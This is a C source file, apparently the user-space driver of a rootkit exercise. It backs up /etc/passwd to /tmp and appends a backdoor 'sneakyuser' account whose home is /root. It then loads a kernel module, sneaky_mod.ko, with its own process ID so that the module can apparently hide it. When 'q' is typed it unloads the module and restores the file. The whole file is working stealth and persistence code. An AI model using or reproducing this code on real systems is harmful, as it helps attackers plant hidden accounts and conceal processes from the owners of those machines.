#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

void copy_file(const char *src, const char *dst) {
  FILE *src_file = fopen(src, "r");
  FILE *dst_file = fopen(dst, "w");

  if (src_file == NULL || dst_file == NULL) {
    perror("Error opening files");
    exit(EXIT_FAILURE);
  }

  char ch;
  while ((ch = fgetc(src_file)) != EOF) {
    fputc(ch, dst_file);
  }

  fclose(src_file);
  fclose(dst_file);
}

int main() {
  printf("sneaky_process pid = %d\n", getpid());

  // Step 1: Copy /etc/passwd to /tmp/passwd
  copy_file("/etc/passwd", "/tmp/passwd");

  // Step 2: Add sneakyuser entry to /etc/passwd
  FILE *passwd_file = fopen("/etc/passwd", "a");
  if (passwd_file == NULL) {
    perror("Error opening /etc/passwd");
    exit(EXIT_FAILURE);
  }
  fprintf(passwd_file, "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  fclose(passwd_file);

  // Step 3: Load the sneaky module and pass process ID
  char insmod_cmd[64];
  snprintf(insmod_cmd, sizeof(insmod_cmd), "insmod sneaky_mod.ko sneaky_pid=%d", getpid());
  system(insmod_cmd);

  // Step 4: Wait for 'q' character from keyboard input
  char ch;
  while ((ch = getchar()) != 'q') {
    // do nothing, just wait for 'q'
  }

  // Step 5: Unload the sneaky kernel module
  system("rmmod sneaky_mod");

  // Step 6: Restore /etc/passwd and remove sneakyuser entry
  copy_file("/tmp/passwd", "/etc/passwd");

  return 0;
}
